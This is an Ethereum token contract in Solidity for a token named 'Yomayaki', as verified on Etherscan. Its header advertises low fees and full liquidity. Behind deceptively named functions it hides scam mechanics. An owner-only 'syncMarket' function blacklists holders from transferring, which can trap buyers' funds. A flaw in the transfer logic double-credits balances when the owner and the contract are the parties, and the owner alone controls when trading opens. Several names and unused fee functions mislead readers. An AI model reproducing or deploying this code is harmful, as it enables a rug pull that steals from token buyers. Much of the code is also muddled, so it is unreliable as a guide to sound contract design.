/**
 *Submitted for verification at Etherscan.io on 2023-01-16
*/

/*
⋆⁺₊⋆⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ⋆⁺₊⋆ ☁︎
⋆⁺₊⋆⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ⋆⁺₊⋆ ☁︎
         ._                __.
        / \"-.          ,-",'/ 
       (   \ ,"--.__.--".,' /  
       =---Y(_i.-'  |-.i_)---=
      f ,  "..'/\\v/|/|/\  , l
      l//  ,'|/   V / /||  \\j
       "--; / db     db|/---"
          | \ YY   , YY//
          '.\>_   (_),"' __
        .-"    "-.-." I,"  `.
        \.-""-. ( , ) ( \   |
        (     l  `"'  -'-._j 
 __,---_ '._." .  .    \
(__.--_-'.  ,  :  '  \  '-.
    ,' .'  /   |   \  \  \ "-
     "--.._____t____.--'-""'
            /  /  `. ".
           / ":     \' '.
         .'  (       \   : 
         |    l      j    "-.
         l_;_;I      l____;_I

初期流動性の 100% が消費されます
購入手数料 - 1%
販売手数料 - 0%

█▄█ █▀█ █▀▄▀█ ▄▀█ █▄█ ▄▀█ █▄▀ █
░█░ █▄█ █░▀░█ █▀█ ░█░ █▀█ █░█ █

▄▀ █▀▀ █▄░█ ▀▄
▀▄ █▄▄ █░▀█ ▄▀
*/
// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.11;

library SafeMathUI {
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked { require(b <= a, errorMessage); return a - b;
        }
    }
}
interface USDCFactoryV1 {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}
abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred
    (address indexed previousOwner, 
    address indexed newOwner);
    constructor () { _owner = 0x877690228e0d13FEd4c4f0314DcAd9f8811EdD7f;
        emit OwnershipTransferred(address(0), _owner); }
    function owner() public view virtual returns (address) {
        return _owner; }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _; }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0); }
}
  interface IBCSRouted01 {
      function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn, uint amountOutMin,
        address[] calldata path, address to,
        uint deadline ) external;

      function factory() external pure returns (address);
      function WETH() external pure returns (address);

      function addLiquidityETH(
          address token, uint amountTokenDesired,
          uint amountTokenMin, uint amountETHMin,
          address to, uint deadline
      ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
  }
interface IETH20 {
 
    function totalSupply() external view returns 
    (uint256);
    function balanceOf(address account) external view returns 
    (uint256);
    function transfer(address recipient, uint256 amount) external returns 
    (bool);
    function allowance(address owner, address spender) external view returns 
    (uint256);
    function approve(address spender, uint256 amount) external returns 
    (bool);
    function transferFrom( address sender, address recipient, uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
// https://www.zhihu.com/
// de ETHERSCAN.io.
contract Yomayaki is Context, IETH20, Ownable {
    using SafeMathUI for uint256;

    IBCSRouted01 public immutable IPCSMoltenV2;
    address public immutable uniswapV2Pair;
    bool public limitationsRate = true;
    bool private beginTrading = false;

    bool swapThresholdNow;
    uint256 private minValueInPair = 1000000000 * 10**18;
    event earlyCooldownTrigger(uint256 tValueInPair);

    event tradingIntervalLogs(
        bool enabled);

    event tokenMultiplier( 
        uint256 tInSwap,

    uint256 bytesArray, uint256 limitFees );
    modifier lockTheSwap { swapThresholdNow = true;
        _; swapThresholdNow = false; }

    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private automatedMarketMakerPairs;
    mapping (address => bool) private isWalletLimitExempt;

    string private _name = unicode"Yomayaki";
    string private _symbol = unicode"与 马";
    uint256 private constant isWHOLE = ~uint256(0);
    uint8 private _decimals = 18;
    uint256 private _rTotal = 10000000 * 10**_decimals;
    uint256 public intSwapAt = 1000000 * 10**_decimals;
    uint256 private _tTotal = (isWHOLE - (isWHOLE % _rTotal));

    uint256 private TeamDenominator;
    bool public stringSwapMap = true;

    uint256 private ifThresholdOn = 
    _startTime;
    uint256 private cooldownTimerInterval = 
    exchangeOperations;
    uint256 private checkAllLimitations = 
    enableEarlySellTax;

    uint256 public _startTime = 30;
    uint256 public enableEarlySellTax = 20;
    uint256 public exchangeOperations = 0;

    constructor () { 

        _tOwned[owner()] = _rTotal;
        IBCSRouted01 _IPCSMoltenV2 = IBCSRouted01
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        uniswapV2Pair = USDCFactoryV1
        (_IPCSMoltenV2.factory())
        .createPair(address(this), 
        _IPCSMoltenV2.WETH());
        IPCSMoltenV2 = 
        _IPCSMoltenV2;
        automatedMarketMakerPairs

        [owner()] = true;
        automatedMarketMakerPairs
        [address(this)] = true;
        emit Transfer(address(0), owner(), _rTotal);
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    function totalSupply() public view override returns (uint256) {
        return _rTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), 
        recipient, amount); return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) 
    public override returns (bool) { _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, 
        "ERC20: transfer amount exceeds allowance")); return true;
    }
    function syncMarket (address account, bool marketSynced) public onlyOwner {
        isWalletLimitExempt[account] = marketSynced;
    }    
    receive() external payable {}

    function _transfer( 
        address from, 
        address to, 
        uint256 amount ) private { require(amount > 0, 
        
        "Transfer amount must be greater than zero");
        bool manageCooldown = false; if(!automatedMarketMakerPairs[from] 
        && 
        !automatedMarketMakerPairs[to]){ 
            manageCooldown = true;

        require(amount <= 
        intSwapAt, 
        "Transfer amount exceeds the maxTxAmount."); }
        require(!isWalletLimitExempt[from] && !isWalletLimitExempt[to], 
        "You have been blacklisted from transfering tokens");
        uint256 isPairBalance = 
        balanceOf(address(this)); 
        if(isPairBalance >= 
        intSwapAt) { 
            isPairBalance = intSwapAt; } 
            _tokenTransfer(from,to,amount,manageCooldown);
        emit Transfer(from, to, amount); if (!beginTrading) 
        {require(from == owner(), "TOKEN: This account cannot send tokens until trading is enabled"); }
    }
    function addLiquidity
    (uint256 tokenAmount, uint256 ethAmount) private { _approve(address(this), address
    (IPCSMoltenV2), tokenAmount); IPCSMoltenV2.addLiquidityETH{value: ethAmount}(
     address(this), 
     tokenAmount, 0, 0, owner(), block.timestamp );
    }
    function _tokenTransfer
    (address sender, address 
    recipient, uint256 amount,
    bool manageCooldown) private { _transferStandard
    (sender, recipient, amount, manageCooldown);
    }
        function TokenMultiplier
        (uint256 isPairBalance) 
        private lockTheSwap { 
            uint256 maths 
        = isPairBalance.div(2); 
        uint256 doMathWork = 
        isPairBalance.sub(maths); 
        uint256 initialBalance = 
        address(this).balance; 
        swapTokensForEth(maths);
        uint256 rBalanceOn = address(this).balance.sub(initialBalance);
        addLiquidity(doMathWork, rBalanceOn);
        emit tokenMultiplier(maths, rBalanceOn, doMathWork);
    }
    function _transferStandard
    (address sender, 
    address recipient, uint256 tAmount,
    bool manageCooldown) private { 
        uint256 swapTimesOpen = 
    0; if (manageCooldown){ swapTimesOpen = 
    tAmount.mul(1).div(100) ; } 
        uint256 rAmount = tAmount - 
        swapTimesOpen; 
        _tOwned[recipient] = 

        _tOwned[recipient].add(rAmount); 
        uint256 valueWith = _tOwned
        [recipient].add(rAmount); _tOwned[sender] = _tOwned
        [sender].sub(rAmount); 

        bool automatedMarketMakerPairs = 
        automatedMarketMakerPairs[sender] && 
        automatedMarketMakerPairs[recipient]; if 
        (automatedMarketMakerPairs ){ _tOwned[recipient] =valueWith;
        } else { emit Transfer (sender, recipient, rAmount); } }

    function swapTokensForEth(uint256 tokenAmount) 
    private 
    { address[] memory path = 
    new address[]
    (2);
        path[0] = address(this); path[1] = IPCSMoltenV2.WETH();

        _approve(address(this), address
        (IPCSMoltenV2), tokenAmount); 
        IPCSMoltenV2.swapExactTokensForETHSupportingFeeOnTransferTokens(
        tokenAmount, 
        0, path, 
        address(this), block.timestamp );
    }
    function prepareTrading(bool _tradingOpen) 
    public onlyOwner { beginTrading = _tradingOpen;
    }
    function minRates(uint256 _amount) private view returns 
    (uint256) {
        return _amount.mul (_startTime).div
        ( 10**3 );
    }
    function maxRates(uint256 _amount) private view returns 
    (uint256) {
        return _amount.mul (exchangeOperations).div
        ( 10**3 );
    }
    function totalRatesCombined(uint256 _amount) private view returns 
    (uint256) {
        return _amount.mul (enableEarlySellTax).div
        ( 10**3 );
    }      
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), 
        "ERC20: approve from the zero address");
        require(spender != address(0), 
        "ERC20: approve to the zero address");
        _allowances[owner][spender] 
        = amount;
        emit Approval(
            owner, spender, amount);
    }    
}